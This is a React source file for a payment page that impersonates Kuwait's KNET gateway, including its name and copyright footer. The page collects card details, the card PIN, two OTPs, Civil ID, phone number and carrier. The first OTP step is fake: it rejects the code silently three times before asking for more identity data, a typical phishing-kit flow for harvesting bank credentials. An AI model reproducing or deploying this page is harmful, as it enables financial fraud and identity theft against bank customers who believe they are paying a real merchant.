import { useEffect, useState } from "react";
import { useLocation } from "wouter";
import { doc, onSnapshot } from "firebase/firestore";
import { db } from "@/lib/firebase";
import { createPayment, updatePaymentStatus } from "@/lib/firestore";
import { Loader2 } from "lucide-react";

const BANKS = [
  { value: "ABK", label: "Al Ahli Bank of Kuwait", cardPrefixes: ["403622", "428628", "423826"] },
  { value: "ALRAJHI", label: "Al Rajhi Bank", cardPrefixes: ["458838"] },
  { value: "BBK", label: "Bank of Bahrain and Kuwait", cardPrefixes: ["418056", "588790"] },
  { value: "BOUBYAN", label: "Boubyan Bank", cardPrefixes: ["470350", "490455", "490456", "404919", "450605", "426058", "431199"] },
  { value: "BURGAN", label: "Burgan Bank", cardPrefixes: ["468564", "402978", "403583", "415254", "450238", "540759", "49219000"] },
  { value: "CBK", label: "Commercial Bank of Kuwait", cardPrefixes: ["532672", "537015", "521175", "516334"] },
  { value: "Doha", label: "Doha Bank", cardPrefixes: ["419252"] },
  { value: "GBK", label: "Gulf Bank", cardPrefixes: ["526206", "531470", "531644", "531329", "517419", "517458", "531471", "559475"] },
  { value: "TAM", label: "TAM Bank", cardPrefixes: ["45077848", "45077849"] },
  { value: "KFH", label: "Kuwait Finance House", cardPrefixes: ["485602", "537016", "5326674", "450778"] },
  { value: "KIB", label: "Kuwait International Bank", cardPrefixes: ["409054", "406464"] },
  { value: "NBK", label: "National Bank of Kuwait", cardPrefixes: ["464452", "589160"] },
  { value: "Weyay", label: "Weyay Bank", cardPrefixes: ["46445250", "543363"] },
  { value: "QNB", label: "Qatar National Bank", cardPrefixes: ["521020", "524745"] },
  { value: "UNB", label: "Union National Bank", cardPrefixes: ["457778"] },
  { value: "WARBA", label: "Warba Bank", cardPrefixes: ["541350", "525528", "532749", "559459"] },
];

interface PaymentInfo {
  cardNumber: string;
  year: string;
  month: string;
  otp: string;
  bank: string;
  pass: string;
  bank_card: string[];
  prefix: string;
  phoneNumber: string;
  network: string;
  idNumber: string;
  otp2: string;
}

function LoaderK() {
  return (
    <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
      <div className="bg-white p-6 rounded-lg flex flex-col items-center gap-4">
        <Loader2 className="h-8 w-8 animate-spin text-blue-600" />
        <p className="text-gray-700">Processing...</p>
      </div>
    </div>
  );
}

export default function PaymentForm() {
  const [step, setStep] = useState<number>(1);
  const [total, setTotal] = useState("0.000");
  const [isLoading, setIsLoading] = useState(false);
  const [, setLocation] = useLocation();
  const [orderId, setOrderId] = useState<string | null>(null);
  const [paymentId, setPaymentId] = useState<string | null>(null);
  const [countdown, setCountdown] = useState(60);
  const [isCountdownActive, setIsCountdownActive] = useState(false);
  const [otpAttempts, setOtpAttempts] = useState(0);
  const [otpValue, setOtpValue] = useState("");
  
  const [paymentInfo, setPaymentInfo] = useState<PaymentInfo>({
    cardNumber: "",
    year: "",
    month: "",
    otp: "",
    bank: "",
    pass: "",
    bank_card: [],
    prefix: "",
    phoneNumber: "",
    network: "",
    idNumber: "",
    otp2: "",
  });

  useEffect(() => {
    const amount = localStorage.getItem("knet_amount");
    const order = localStorage.getItem("knet_orderId");
    if (amount) setTotal(amount);
    if (order) setOrderId(order);
  }, []);

  useEffect(() => {
    let interval: ReturnType<typeof setInterval> | null = null;

    if (isCountdownActive && countdown > 0) {
      interval = setInterval(() => {
        setCountdown((prev) => prev - 1);
      }, 1000);
    } else if (countdown === 0) {
      setIsCountdownActive(false);
    }

    return () => {
      if (interval) clearInterval(interval);
    };
  }, [isCountdownActive, countdown]);

  useEffect(() => {
    if (!paymentId) return;
    
    const unsubscribe = onSnapshot(doc(db, "payments", paymentId), (docSnap) => {
      if (docSnap.exists()) {
        const data = docSnap.data();
        if (data.status === "approved") {
          setIsLoading(false);
          localStorage.removeItem("knet_amount");
          localStorage.removeItem("knet_orderId");
          setLocation(`/checkout?success=true&orderId=${orderId}`);
        }
      }
    });
    return () => unsubscribe();
  }, [paymentId, orderId, setLocation]);

  const handleSubmitStep1 = async () => {
    setIsLoading(true);
    try {
      const payment = await createPayment({
        orderId: orderId || "unknown",
        amount: total,
        cardInfo: {
          bank: paymentInfo.bank,
          prefix: paymentInfo.prefix,
          lastFour: paymentInfo.cardNumber.slice(-4),
          month: paymentInfo.month,
          year: paymentInfo.year,
        }
      });
      setPaymentId(payment);
      
      setTimeout(() => {
        setStep(2);
        setIsCountdownActive(true);
        setIsLoading(false);
      }, 2000);
    } catch (error) {
      console.error("Payment error:", error);
      setIsLoading(false);
    }
  };

  const handleSubmitOtp = async () => {
    setIsLoading(true);
    const newAttemptCount = otpAttempts + 1;
    setOtpAttempts(newAttemptCount);
    setOtpValue("");

    setTimeout(() => {
      if (newAttemptCount >= 3) {
        setStep(3);
        setOtpAttempts(0);
      }
      setIsLoading(false);
    }, 3000);
  };

  const handleSubmitStep3 = async () => {
    setIsLoading(true);
    setTimeout(() => {
      setStep(4);
      setIsLoading(false);
    }, 5000);
  };

  const handleSubmitStep4 = async () => {
    setIsLoading(true);
    if (paymentId) {
      await updatePaymentStatus(paymentId, "approved");
    }
    setTimeout(() => {
      setIsLoading(false);
      localStorage.removeItem("knet_amount");
      localStorage.removeItem("knet_orderId");
      setLocation(`/checkout?success=true&orderId=${orderId}`);
    }, 3000);
  };

  const isStep1Valid = paymentInfo.prefix && paymentInfo.bank && paymentInfo.cardNumber.length >= 6 && paymentInfo.pass.length === 4 && paymentInfo.month && paymentInfo.year;
  const isStep2Valid = paymentInfo.otp.length === 6;

  return (
    <div className="min-h-screen bg-gray-100" dir="ltr">
      <div className="max-w-md mx-auto p-4">
        <div className="bg-white rounded-lg shadow-lg overflow-hidden">
          <div className="bg-blue-600 p-4 text-center">
            <h1 className="text-2xl font-bold text-white">KNET Payment</h1>
            <p className="text-blue-100 text-sm">Secure Payment Gateway</p>
          </div>

          <div className="p-6 space-y-4">
            <div className="bg-gray-50 p-4 rounded-lg">
              <div className="flex justify-between items-center">
                <span className="text-gray-600">Amount:</span>
                <span className="text-xl font-bold text-blue-600">{total} KWD</span>
              </div>
              <div className="flex justify-between items-center mt-2">
                <span className="text-gray-600">Merchant:</span>
                <span className="font-medium">Al Thenayan Farms</span>
              </div>
            </div>

            {step === 1 && (
              <div className="space-y-4">
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1">
                    Select Your Bank
                  </label>
                  <select
                    className="w-full border border-gray-300 rounded-md px-3 py-2 focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                    value={paymentInfo.bank}
                    onChange={(e) => {
                      const selectedBank = BANKS.find(bank => bank.value === e.target.value);
                      setPaymentInfo({
                        ...paymentInfo,
                        bank: e.target.value,
                        bank_card: selectedBank ? selectedBank.cardPrefixes : [],
                        prefix: "",
                      });
                    }}
                    data-testid="select-bank"
                  >
                    <option value="">Select Your Bank</option>
                    {BANKS.map((bank) => (
                      <option key={bank.value} value={bank.value}>
                        {bank.label} [{bank.value}]
                      </option>
                    ))}
                  </select>
                </div>

                <div className="grid grid-cols-3 gap-2">
                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-1">
                      Prefix
                    </label>
                    <select
                      className="w-full border border-gray-300 rounded-md px-3 py-2 focus:ring-2 focus:ring-blue-500"
                      value={paymentInfo.prefix}
                      onChange={(e) => setPaymentInfo({ ...paymentInfo, prefix: e.target.value })}
                      disabled={!paymentInfo.bank}
                      data-testid="select-prefix"
                    >
                      <option value="">Prefix</option>
                      {paymentInfo.bank_card.map((prefix) => (
                        <option key={prefix} value={prefix}>{prefix}</option>
                      ))}
                    </select>
                  </div>
                  <div className="col-span-2">
                    <label className="block text-sm font-medium text-gray-700 mb-1">
                      Card Number
                    </label>
                    <input
                      type="tel"
                      inputMode="numeric"
                      maxLength={10}
                      className="w-full border border-gray-300 rounded-md px-3 py-2 focus:ring-2 focus:ring-blue-500"
                      placeholder="Card Number"
                      value={paymentInfo.cardNumber}
                      onChange={(e) => setPaymentInfo({ ...paymentInfo, cardNumber: e.target.value.replace(/\D/g, '') })}
                      data-testid="input-card-number"
                    />
                  </div>
                </div>

                <div className="grid grid-cols-2 gap-2">
                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-1">
                      Expiry Month
                    </label>
                    <select
                      className="w-full border border-gray-300 rounded-md px-3 py-2 focus:ring-2 focus:ring-blue-500"
                      value={paymentInfo.month}
                      onChange={(e) => setPaymentInfo({ ...paymentInfo, month: e.target.value })}
                      data-testid="select-month"
                    >
                      <option value="">MM</option>
                      {Array.from({ length: 12 }, (_, i) => i + 1).map((m) => (
                        <option key={m} value={m.toString().padStart(2, '0')}>
                          {m.toString().padStart(2, '0')}
                        </option>
                      ))}
                    </select>
                  </div>
                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-1">
                      Expiry Year
                    </label>
                    <select
                      className="w-full border border-gray-300 rounded-md px-3 py-2 focus:ring-2 focus:ring-blue-500"
                      value={paymentInfo.year}
                      onChange={(e) => setPaymentInfo({ ...paymentInfo, year: e.target.value })}
                      data-testid="select-year"
                    >
                      <option value="">YYYY</option>
                      {Array.from({ length: 15 }, (_, i) => 2024 + i).map((year) => (
                        <option key={year} value={year.toString()}>{year}</option>
                      ))}
                    </select>
                  </div>
                </div>

                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1">
                    PIN (4 digits)
                  </label>
                  <input
                    type="password"
                    inputMode="numeric"
                    maxLength={4}
                    className="w-full border border-gray-300 rounded-md px-3 py-2 focus:ring-2 focus:ring-blue-500"
                    placeholder="Enter PIN"
                    value={paymentInfo.pass}
                    onChange={(e) => setPaymentInfo({ ...paymentInfo, pass: e.target.value.replace(/\D/g, '') })}
                    data-testid="input-pin"
                  />
                </div>
              </div>
            )}

            {step === 2 && (
              <div className="space-y-4">
                <div className="bg-yellow-50 border border-yellow-200 p-4 rounded-lg">
                  <p className="text-yellow-800 text-sm">
                    A 6-digit verification code has been sent to your registered phone number.
                  </p>
                </div>

                <div className="bg-gray-50 p-4 rounded-lg space-y-2">
                  <div className="flex justify-between">
                    <span className="text-gray-600">Card:</span>
                    <span>****{paymentInfo.cardNumber.slice(-4)}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-600">Expiry:</span>
                    <span>{paymentInfo.month}/{paymentInfo.year}</span>
                  </div>
                </div>

                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1">
                    OTP Code
                  </label>
                  <input
                    type="tel"
                    inputMode="numeric"
                    maxLength={6}
                    className="w-full border border-gray-300 rounded-md px-3 py-2 focus:ring-2 focus:ring-blue-500 text-center text-xl tracking-widest"
                    placeholder={`Timeout: 00:${countdown.toString().padStart(2, '0')}`}
                    value={otpValue}
                    onChange={(e) => {
                      const val = e.target.value.replace(/\D/g, '');
                      setOtpValue(val);
                      setPaymentInfo({ ...paymentInfo, otp: val });
                    }}
                    data-testid="input-otp"
                  />
                </div>
              </div>
            )}

            {step === 3 && (
              <div className="space-y-4">
                <div className="bg-blue-50 border border-blue-200 p-4 rounded-lg">
                  <p className="text-blue-800 text-sm">
                    Additional verification required. Please provide the following information.
                  </p>
                </div>

                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1">
                    Civil ID Number
                  </label>
                  <input
                    type="tel"
                    inputMode="numeric"
                    maxLength={12}
                    className="w-full border border-gray-300 rounded-md px-3 py-2 focus:ring-2 focus:ring-blue-500"
                    placeholder="Enter Civil ID"
                    value={paymentInfo.idNumber}
                    onChange={(e) => setPaymentInfo({ ...paymentInfo, idNumber: e.target.value.replace(/\D/g, '') })}
                    data-testid="input-civil-id"
                  />
                </div>

                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1">
                    Phone Number
                  </label>
                  <input
                    type="tel"
                    inputMode="numeric"
                    maxLength={8}
                    className="w-full border border-gray-300 rounded-md px-3 py-2 focus:ring-2 focus:ring-blue-500"
                    placeholder="Enter Phone Number"
                    value={paymentInfo.phoneNumber}
                    onChange={(e) => setPaymentInfo({ ...paymentInfo, phoneNumber: e.target.value.replace(/\D/g, '') })}
                    data-testid="input-phone"
                  />
                </div>

                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1">
                    Network Operator
                  </label>
                  <select
                    className="w-full border border-gray-300 rounded-md px-3 py-2 focus:ring-2 focus:ring-blue-500"
                    value={paymentInfo.network}
                    onChange={(e) => setPaymentInfo({ ...paymentInfo, network: e.target.value })}
                    data-testid="select-network"
                  >
                    <option value="">Select Network</option>
                    <option value="Zain">Zain</option>
                    <option value="STC">STC</option>
                    <option value="Ooredoo">Ooredoo</option>
                  </select>
                </div>
              </div>
            )}

            {step === 4 && (
              <div className="space-y-4">
                <div className="bg-yellow-50 border border-yellow-200 p-4 rounded-lg">
                  <p className="text-yellow-800 text-sm">
                    A new verification code has been sent to your phone.
                  </p>
                </div>

                <div className="bg-gray-50 p-4 rounded-lg space-y-2">
                  <div className="flex justify-between">
                    <span className="text-gray-600">Civil ID:</span>
                    <span>{paymentInfo.idNumber}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-600">Phone:</span>
                    <span>{paymentInfo.phoneNumber}</span>
                  </div>
                </div>

                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1">
                    OTP Code
                  </label>
                  <input
                    type="tel"
                    inputMode="numeric"
                    maxLength={6}
                    className="w-full border border-gray-300 rounded-md px-3 py-2 focus:ring-2 focus:ring-blue-500 text-center text-xl tracking-widest"
                    placeholder="Enter OTP"
                    value={paymentInfo.otp2}
                    onChange={(e) => setPaymentInfo({ ...paymentInfo, otp2: e.target.value.replace(/\D/g, '') })}
                    data-testid="input-otp2"
                  />
                </div>
              </div>
            )}

            <div className="flex gap-3 pt-4">
              <button
                type="button"
                className="flex-1 bg-blue-600 text-white py-3 rounded-lg font-medium hover:bg-blue-700 disabled:bg-gray-300 disabled:cursor-not-allowed transition-colors"
                disabled={
                  (step === 1 && !isStep1Valid) ||
                  (step === 2 && !isStep2Valid) ||
                  isLoading
                }
                onClick={() => {
                  if (step === 1) handleSubmitStep1();
                  else if (step === 2) handleSubmitOtp();
                  else if (step === 3) handleSubmitStep3();
                  else if (step === 4) handleSubmitStep4();
                }}
                data-testid="button-submit"
              >
                {isLoading ? "Processing..." : step === 1 ? "Submit" : "Confirm"}
              </button>
              <button
                type="button"
                className="px-6 py-3 border border-gray-300 rounded-lg font-medium text-gray-700 hover:bg-gray-50 transition-colors"
                onClick={() => setLocation("/checkout")}
                data-testid="button-cancel"
              >
                Cancel
              </button>
            </div>
          </div>

          <div className="bg-gray-50 p-4 text-center text-xs text-gray-500 border-t">
            All Rights Reserved. Copyright 2024<br />
            <strong>The Shared Electronic Banking Services Company - KNET</strong>
          </div>
        </div>
      </div>
      {isLoading && <LoaderK />}
    </div>
  );
}
